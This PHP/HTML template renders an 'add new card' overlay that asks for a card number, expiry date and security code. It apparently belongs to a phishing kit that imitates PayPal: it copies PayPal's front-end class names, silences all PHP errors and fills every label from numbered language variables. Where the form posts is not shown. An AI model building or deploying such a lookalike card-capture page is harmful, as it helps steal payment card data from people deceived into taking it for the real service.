<?php
error_reporting(0);
ini_set('display_errors', 0);
?>
    <div id="thisforaddnewCard">
    <section id="overpanel" class="theoverpanel animated  med fadeInUpBig">
        <div class=" overpanel-wrapper row">
            <div class="col-xs-12">
                <a  class="dismiss close nemo_dismissClose" id="CloseTable">
                    <span class="icon icon-close-small"></span>
                    <span class="accessAid"><?php echo $lang_2c ?></span>
                </a>
            </div>
            <div class=" overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4" role="document">
                <div class=" overpanel-header" id="overpanel-header">
                    <h2 id="overpanel-header"><?php echo $lang_2d ?></h2>
                </div>
                <div class="twbs_alert vx_alert vx_alert-critical js_alertMsg hide" id="MSGError">
                    <p class="vx_alert-text"><?php echo $lang_19 ?></p>
                </div>
                <div class=" overpanel-body">
                    <form name="addCreditOrDebit" method="post" id="AddNewCardForm">
                        <div class="creditCardInput clearfix">
                            <div class="creditCardInput-layout">
                                <div class="cardNumber" id="cardNumber">
                                    <div class="textInput ccNumber ccNumber ccNum lap" id="CardNumberID">
                                        <input type="text" placeholder="<?php echo $lang_21 ?>" id="CardNumberInput" name="CardNumberInput"/>
                                    </div>
                                    <div class="cardLogo ">
                                        <span class="fiModule-icon_card " id="cardLogo"></span>
                                    </div>
                                </div>
                                <div class="cardInputs">
                                    <div class="expiration js_card_toggleField" >
                                        <div class="textInput expirationDate js_expirationDate expirationDate expirationDate lap" id="CardExpID">
                                            <input type="text" placeholder="<?php echo $lang_22 ?>" id="CardExpInput" name="CardExpInput"/>
                                        </div>
                                    </div>
                                    <div class="js_card_toggleField" id="cardSecurityCode">
                                        <div class="textInput csc pull-right csc securityCode lap" id="CardcvvID" data-ctype="">
                                            <input type="text" placeholder="<?php echo $lang_23 ?>" id="CardcvvInput" name="CardcvvInput" />
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <input class="save js_addCard-btn_save vx_btn validateBeforeSubmit nemo_saveCreditOrDebit" type="submit" value="<?php echo $lang_24 ?>" id="btnConfirm"/>
                    </form>
                </div>
            </div>
        </div>
        <div class="hasSpinner hide" id="loding">
        </div>
    </div>
</div>